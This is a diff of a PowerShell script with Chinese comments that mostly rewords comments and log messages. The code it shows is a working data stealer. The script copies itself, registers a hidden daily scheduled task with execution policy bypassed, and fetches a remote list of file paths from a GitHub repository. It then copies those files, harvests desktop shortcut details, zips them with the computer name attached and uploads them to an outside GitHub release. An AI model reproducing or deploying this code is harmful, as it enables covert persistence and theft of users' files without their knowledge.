@@ -15,7 +15,7 @@ function Log($msg) {
 
 Log "`n==== Script Started ===="
 
-# === 保存副本到可执行位置 ===
+# === 保存副本 ===
 try {
     $self = $MyInvocation.MyCommand.Definition
     Copy-Item -Path $self -Destination $localPath -Force -ErrorAction Stop
@@ -25,7 +25,7 @@ try {
     Pause; Start-Process notepad.exe $logPath; exit 1
 }
 
-# === 注册任务计划 ===
+# === 注册计划任务 ===
 try {
     $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
     $trigger = New-ScheduledTaskTrigger -Daily -At "00:00"
@@ -37,14 +37,14 @@ try {
     Pause; Start-Process notepad.exe $logPath; exit 2
 }
 
-# === 检查 GitHub Token ===
+# === 检查 GITHUB_TOKEN ===
 $token = $env:GITHUB_TOKEN
 if (-not $token) {
     Log "❌ 环境变量 GITHUB_TOKEN 未设置"
     Pause; Start-Process notepad.exe $logPath; exit 3
 }
 
-# === 设置上传参数 ===
+# === 上传逻辑 ===
 $repo = "rtyuiuiop/1"
 $now = Get-Date
 $timestamp = $now.ToString("yyyy-MM-dd-HHmmss")
@@ -57,19 +57,19 @@ $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force | Out-Null
 
-# === 下载文件列表 ===
+# STEP 1 - 下载路径列表
 $remoteTxtUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/upload-target.txt"
 try {
-    Log "📥 下载上传目录..."
+    Log "📥 下载上传路径列表..."
     $remoteList = Invoke-RestMethod -Uri $remoteTxtUrl -UseBasicParsing -ErrorAction Stop
     $pathList = $remoteList -split "`n" | Where-Object { $_.Trim() -ne "" }
-    Log "✅ 加载路径列表，共 $($pathList.Count) 条"
+    Log "✅ 成功加载 $($pathList.Count) 个路径"
 } catch {
     Log "❌ 下载路径列表失败：$($_.Exception.Message)"
     Pause; Start-Process notepad.exe $logPath; exit 4
 }
 
-# === 复制文件到临时目录 ===
+# STEP 2 - 复制文件
 $index = 0
 foreach ($path in $pathList) {
     $index++
@@ -95,7 +95,7 @@ foreach ($path in $pathList) {
     }
 }
 
-# === 提取桌面快捷信息 ===
+# STEP 3 - 收集桌面快捷方式
 try {
     $desktop = [Environment]::GetFolderPath("Desktop")
     $lnkFiles = Get-ChildItem -Path $desktop -Filter *.lnk -ErrorAction SilentlyContinue
@@ -106,12 +106,12 @@ try {
         $report += "[$($lnk.Name)]`nTarget: $($sc.TargetPath)`nArgs: $($sc.Arguments)`nStartIn: $($sc.WorkingDirectory)`nIcon: $($sc.IconLocation)`n-----`n"
     }
     $report | Out-File (Join-Path $tempRoot "lnk_info.txt") -Encoding UTF8
-    Log "🧷 快捷方式已收集"
+    Log "🧷 快捷方式信息已收集"
 } catch {
-    Log "⚠️ 快捷方式收集失败：$($_.Exception.Message)"
+    Log "⚠️ 快捷方式提取失败：$($_.Exception.Message)"
 }
 
-# === 生成 ZIP ===
+# STEP 4 - 压缩
 try {
     Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force
     Log "📦 压缩完成：$zipPath"
@@ -120,7 +120,7 @@ try {
     Pause; Start-Process notepad.exe $logPath; exit 5
 }
 
-# === 上传至 GitHub Release ===
+# STEP 5 - 上传至 GitHub Release
 $releaseData = @{
     tag_name   = $tag
     name       = $releaseName
@@ -132,7 +132,7 @@ $releaseData = @{
 $headers = @{
     Authorization = "token $token"
     "User-Agent"  = "PSUploader"
-    Accept         = "application/vnd.github.v3+json"
+    Accept        = "application/vnd.github.v3+json"
 }
 
 try {
@@ -147,20 +147,20 @@ try {
 try {
     $bytes = [System.IO.File]::ReadAllBytes($zipPath)
     Invoke-RestMethod -Uri $uploadUrl -Method POST -Headers @{ Authorization="token $token"; "Content-Type"="application/zip" } -Body $bytes
-    Log "☁️ 文件上传成功：$zipName"
+    Log "☁️ 上传成功：$zipName"
 } catch {
-    Log "❌ 上传 ZIP 失败：$($_.Exception.Message)"
+    Log "❌ 上传失败：$($_.Exception.Message)"
     Pause; Start-Process notepad.exe $logPath; exit 7
 }
 
-# === 清理临时文件 ===
+# STEP 6 - 清理
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 Log "🧹 清理完成"
 Log "==== Script Finished ===="
 
-# === 首次运行时暂停并打开日志 ===
-if ($MyInvocation.MyCommand.Path -notlike "$localPath") {
+# STEP 7 - 安装阶段查看日志
+if ($MyInvocation.MyCommand.Path -ne $localPath) {
     Pause
     Start-Process notepad.exe $logPath
 }
